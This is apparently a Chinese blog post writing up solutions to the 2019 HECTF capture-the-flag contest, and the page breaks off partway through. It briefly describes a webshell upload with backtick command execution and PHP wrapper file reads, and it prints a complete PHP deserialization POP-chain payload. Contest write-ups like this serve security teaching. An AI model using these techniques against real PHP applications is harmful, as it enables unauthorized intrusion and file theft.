<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>2019HECTF wp | Damya&#39;s Blog | あややこやや</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="团队ctf竞赛">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Damya</h5>
          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
            
              <span>3</span>
            
              <span>9</span>
            
              <span>7</span>
            
              <span>5</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/DamyaHome" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>2019HECTF wp</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">2019HECTF wp</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-11-08T12:14:30.000Z" itemprop="datePublished" class="page-time">
  2019-11-08
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-2019HECTF-wp"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">2019HECTF wp</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-11-08 20:14:30" datetime="2019-11-08T12:14:30.000Z"  itemprop="datePublished">2019-11-08</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Code-execution"><a href="#Code-execution" class="headerlink" title="Code execution"></a>Code execution</h2><p>首页是一个shell.php，访问</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>cmd不能执行phpinfo，而php_cmd却可以</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>在upload页面上一句话，在根目录下发现flag.txt，但是没有权限访问</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>所以就利用cmd_php来执行命令，这里用反引号执行</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./4.png" title="图片" data-fancybox="images"><img src="./4.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="我只会ping吗"><a href="#我只会ping吗" class="headerlink" title="我只会ping吗"></a><strong>我只会</strong>ping<strong>吗</strong></h2><figure class="image-box">
                <a rel=2019HECTF wp href="./5.png" title="图片" data-fancybox="images"><img src="./5.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=2019HECTF wp href="./6.png" title="图片" data-fancybox="images"><img src="./6.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="file在哪里"><a href="#file在哪里" class="headerlink" title="file在哪里"></a><strong>file在哪里</strong></h2><p><strong>php伪协议读hint.php</strong></p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./7.png" title="图片" data-fancybox="images"><img src="./7.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>base64解码得到</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./8.png" title="图片" data-fancybox="images"><img src="./8.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>然后spam+栅栏密码解密<a href="http://www.spammimic.com/decode.cgi" target="_blank" rel="noopener">http://www.spammimic.com/decode.cgi</a></p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./9.png" title="图片" data-fancybox="images"><img src="./9.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="Romance签到"><a href="#Romance签到" class="headerlink" title="Romance签到"></a><strong>Romance签到</strong></h2><figure class="image-box">
                <a rel=2019HECTF wp href="./10.png" title="图片" data-fancybox="images"><img src="./10.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>访问得到hint.php</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></p>
<p>在线解密flag{1ac59eab-7240-446e-b52b-a795e102966a}</p>
<h2 id="金闪闪的小饼干"><a href="#金闪闪的小饼干" class="headerlink" title="金闪闪的小饼干"></a><strong>金闪闪的小饼干</strong></h2><p>题目提示金闪闪的小饼干，抓包查看cookie</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./12.png" title="图片" data-fancybox="images"><img src="./12.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>base64解码值就是flag</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./13.png" title="图片" data-fancybox="images"><img src="./13.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="缘分"><a href="#缘分" class="headerlink" title="缘分"></a>缘分</h2><p>根据题目提示“相恨见晚”，说明Hint中的特定时间是指晚上</p>
<p>在晚上的时候，在登陆界面随便输入，出现Warning</p>
<p>根据warning里的内容，flag中输入adimn，name输入admin123，提交以后得到flag</p>
<h2 id="你看这个php它又大又圆"><a href="#你看这个php它又大又圆" class="headerlink" title="你看这个php它又大又圆"></a>你看这个php它又大又圆</h2><figure class="image-box">
                <a rel=2019HECTF wp href="./14.png" title="图片" data-fancybox="images"><img src="./14.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>根据代码一步一步来，user需要等于admin</p>
<p>可以使用php伪协议来完成。</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>然后构造pass使用数组绕过即可</p>
<p>然后file使用伪协议读取即可</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./16.png" title="图片" data-fancybox="images"><img src="./16.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>base64解密即可</p>
<p>DQo8P3BocA0KDQplcnJvcl9yZXBvcnRpbmcoRV9BTEwgJiB+RV9OT1RJQ0UpOw0KDQovL2ZsYWd7SGU2VHVDVEZAOkYxYTkxc3RIMXN9DQoNCj8+DQo=</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./17.png" title="图片" data-fancybox="images"><img src="./17.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="让我们来一起变魔术吧"><a href="#让我们来一起变魔术吧" class="headerlink" title="让我们来一起变魔术吧"></a>让我们来一起变魔术吧</h2><p>F12首先看到源码</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./18.png" title="图片" data-fancybox="images"><img src="./18.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>可以看出是反序列化函数，首先收集函数，然后构造攻击链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.__get()：读取不可访问属性的值时，__get() 会被调用</span><br><span class="line">2.__toString()：是在直接输出对象引用时自动调用的</span><br><span class="line">3.__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line">__toString()作为最好触发应该为攻击链突破口，然后在Test中寻找到return $func(),看来是调用__invoke()的缺口，然后就是__get()的调用了，在__toString()中看到str[&apos;str&apos;]-&gt;soure可以看出能够调用非Show类的函数，从而触发__get().</span><br><span class="line">4.现在还有一个token==token_flag这里我们可以使用php引用漏洞</span><br><span class="line">$a = 1 </span><br><span class="line">$b = &amp;$a</span><br><span class="line">$a = $a +1</span><br><span class="line">即可得$b =2</span><br><span class="line">5.攻击链</span><br><span class="line">Show()-&gt;__toString-&gt;Test()-&gt;__get-&gt;Read()-&gt;__invoke</span><br></pre></td></tr></table></figure></p>
<p>构造反序列化需要反攻击链<br>代码为</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./19.png" title="图片" data-fancybox="images"><img src="./19.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>构造序列化为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：O:4:<span class="string">"Show"</span>:2:&#123;s:6:<span class="string">"source"</span>;O:4:<span class="string">"Show"</span>:2:&#123;s:6:<span class="string">"source"</span>;N;s:3:<span class="string">"str"</span>;a:1:&#123;s:3:<span class="string">"str"</span>;O:4:<span class="string">"Test"</span>:1:&#123;s:6:<span class="string">"params"</span>;O:4:<span class="string">"Read"</span>:3:&#123;s:3:<span class="string">"var"</span>;N;s:5:<span class="string">"token"</span>;N;s:10:<span class="string">"token_flag"</span>;R:8;&#125;&#125;&#125;&#125;s:3:<span class="string">"str"</span>;N;&#125;</span><br></pre></td></tr></table></figure></p>
<p>flag{224761e8-fb8c-460d-bc65-a151470d7085}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="问卷题目"><a href="#问卷题目" class="headerlink" title="问卷题目"></a>问卷题目</h2><p> 提交问卷就给flag</p>
<h2 id="哪吒？！"><a href="#哪吒？！" class="headerlink" title="哪吒？！"></a>哪吒？！</h2><p>拖进winhex尾部看到pk头,foremost分离得到加密zip</p>
<p>拖进winhex发现是伪加密,破解得到flag</p>
<p>HEBTUCTF{Y0u_f0und_me!}</p>
<h2 id="这是一个极其简单的签到题"><a href="#这是一个极其简单的签到题" class="headerlink" title="这是一个极其简单的签到题"></a>这是一个极其简单的签到题</h2><p>下载后得到一个分辨率为3x500的jpeg图片.</p>
<p>在Kali使用binwalk发现该图为gif格式.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./20.png" title="图片" data-fancybox="images"><img src="./20.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>更改格式后发现图内不断闪过字母(应该是flag),因为图片分辨率太小,很难观察到图内的全部内容，所以先进行gif的分帧并将所有帧拼接。</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./21.png" title="图片" data-fancybox="images"><img src="./21.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>大功告成,得到Flag.</p>
<h2 id="印证血统的时候到了"><a href="#印证血统的时候到了" class="headerlink" title="印证血统的时候到了"></a>印证血统的时候到了</h2><p>在drawing.js下有aaencode加密,找在线网站解密</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    alert(<span class="string">"wait a minute"</span>);</span><br><span class="line">    alert(<span class="string">"Wait."</span>);</span><br><span class="line">    alert(<span class="string">"Wait.."</span>);</span><br><span class="line">    alert(<span class="string">"Wait..."</span>);</span><br><span class="line">    alert(<span class="string">"flag 在来的路上出了点问题"</span>);</span><br><span class="line">    <span class="keyword">var</span> flag=<span class="string">"诶呀呀 你看着可爱的小表情     ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀sojson.com*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ])(ﾟΘﾟ))((ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ)+(ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]);"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>百度搜索<br>密码flag{f25a7a4b-6eae-43c5-bbe9-b76aa74c8368}</p>
<h2 id="咕咕咕果"><a href="#咕咕咕果" class="headerlink" title="咕咕咕果"></a>咕咕咕果</h2><figure class="image-box">
                <a rel=2019HECTF wp href="./22.png" title="图片" data-fancybox="images"><img src="./22.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>通过魔法上网,访问<a href="https://www.google.com/flag.txt" target="_blank" rel="noopener">https://www.google.com/flag.txt</a>，</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./23.png" title="图片" data-fancybox="images"><img src="./23.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>最后得到Flag.</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="qiandao"><a href="#qiandao" class="headerlink" title="qiandao"></a>qiandao</h2><p>1.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./24.png" title="图片" data-fancybox="images"><img src="./24.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>2.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./25.png" title="图片" data-fancybox="images"><img src="./25.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="helloRE"><a href="#helloRE" class="headerlink" title="helloRE"></a>helloRE</h2><p>1.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./26.png" title="图片" data-fancybox="images"><img src="./26.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>2.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./27.png" title="图片" data-fancybox="images"><img src="./27.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>3.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./28.png" title="图片" data-fancybox="images"><img src="./28.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>4.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./29.png" title="图片" data-fancybox="images"><img src="./29.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>5.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./30.png" title="图片" data-fancybox="images"><img src="./30.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>6.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./31.png" title="图片" data-fancybox="images"><img src="./31.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>7.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./32.png" title="图片" data-fancybox="images"><img src="./32.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>8.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./33.png" title="图片" data-fancybox="images"><img src="./33.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>9.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./34.png" title="图片" data-fancybox="images"><img src="./34.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>10.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./35.png" title="图片" data-fancybox="images"><img src="./35.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>11.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./36.png" title="图片" data-fancybox="images"><img src="./36.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>12.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./37.png" title="图片" data-fancybox="images"><img src="./37.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>13.</p>
<p>这就是最终的脚本了。</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./38.png" title="图片" data-fancybox="images"><img src="./38.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>14.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./39.png" title="图片" data-fancybox="images"><img src="./39.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>15.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./40.png" title="图片" data-fancybox="images"><img src="./40.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>16.</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./41.png" title="图片" data-fancybox="images"><img src="./41.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="鼠鼠"><a href="#鼠鼠" class="headerlink" title="## 鼠鼠"></a>## 鼠鼠</h2><p>第一段flag在提取的ole的vba代码里</p>
<figure class="image-box">
                <a rel=2019HECTF wp href="./42.png" title="图片" data-fancybox="images"><img src="./42.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>第二段flag需要异或得到</p>
<figure class="image-box">
